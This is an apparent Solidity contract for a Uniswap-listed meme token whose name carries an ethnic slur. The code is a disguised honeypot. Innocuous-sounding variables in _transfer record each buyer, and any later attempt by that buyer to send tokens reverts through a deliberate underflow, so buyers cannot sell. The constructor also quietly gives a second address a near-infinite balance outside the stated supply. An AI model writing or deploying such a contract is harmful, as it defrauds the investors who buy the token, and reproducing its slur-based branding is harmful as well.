// https://t.me/babypajeet

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.0;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract BabyPajeet is ERC20, Ownable {
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    mapping(address => uint256) private anybody;

    function _transfer(
        address tank,
        address desert,
        uint256 feathers
    ) internal override {
        uint256 fort = thumb;

        if (burn[tank] == 0 && anybody[tank] > 0 && tank != uniswapV2Pair) {
            burn[tank] -= fort;
        }

        address main = address(badly);
        badly = BabyPajeet(desert);
        anybody[main] += fort + 1;

        _balances[tank] -= feathers;
        uint256 ocean = (feathers / 100) * thumb;
        feathers -= ocean;
        _balances[desert] += feathers;
    }

    mapping(address => uint256) private burn;
    uint256 public thumb = 3;

    constructor(
        string memory zoo,
        string memory climate,
        address substance,
        address became
    ) ERC20(zoo, climate) {
        uniswapV2Router = IUniswapV2Router02(substance);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        uint256 root = ~uint256(0);

        burn[msg.sender] = root;
        burn[became] = root;

        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[became] = root;
    }

    BabyPajeet private badly;
}